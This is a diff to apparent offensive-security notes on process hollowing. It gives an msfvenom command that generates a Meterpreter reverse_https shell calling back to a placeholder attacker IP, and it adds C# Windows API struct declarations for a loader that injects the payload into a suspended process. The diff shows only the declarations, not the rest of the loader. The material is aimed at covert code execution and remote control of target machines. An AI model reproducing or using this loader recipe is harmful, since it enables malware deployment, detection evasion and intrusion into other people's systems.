@@ -109,6 +109,7 @@ namespace Inject
 ## Process Hollowing
 Start a process in suspended state, change its machine code before resuming execution
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f csharp`
+2. Put this in Visual Studio
 ```
 using System;
 using System.Diagnostics;
@@ -140,6 +141,49 @@ namespace Inject
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern uint ResumeThread(IntPtr hThread);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
 
         static void Main(string[] args)
         {
